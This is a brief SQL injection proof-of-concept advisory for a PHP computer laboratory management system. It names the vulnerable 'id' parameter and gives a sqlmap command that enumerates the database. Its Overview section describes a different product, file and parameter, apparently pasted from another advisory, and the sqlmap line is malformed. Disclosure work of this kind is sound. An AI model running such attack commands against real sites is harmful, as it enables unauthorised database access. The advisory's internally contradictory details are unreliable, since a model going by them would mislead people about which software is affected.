
# Computer-Laboratory-Management-System-SQLi-PoC
+ Exploit Author: Emirhan Mutlu
# Vendor Homepage
+ https://www.sourcecodester.com/php/17268/computer-laboratory-management-system-using-php-and-mysql.html
# Software Link
+ https://www.sourcecodester.com/php/17268/computer-laboratory-management-system-using-php-and-mysql.html
# Overview
+ PHPGurukul Restaurant Table Booking System 1.0 is susceptible to a significant security vulnerability that arises from insufficient protection on the 'username' parameter in the 'rtbs/admin/index.php' file.  This flaw can potentially be exploited to inject malicious SQL queries, leading to unauthorized access and extraction of sensitive information from the database.
# Vulnerability Details
+ Vulnerable Endpoint: /php-lms/admin/category/view_category.php?id=1
+ Parameter: id
# Description
+ The lack of proper input validation and sanitization on the 'id' parameter allows an attacker to craft SQL injection queries and gaining unauthorized access to the database.

# Proof of Concept (PoC) : 
+ `sqlmap -u "http://localhost/php-lms/admin/category/view_category.php?id=1"--data "id=1"  --batch --level 5 --risk 3 --dbms=mysql --threads 10 --current-db`
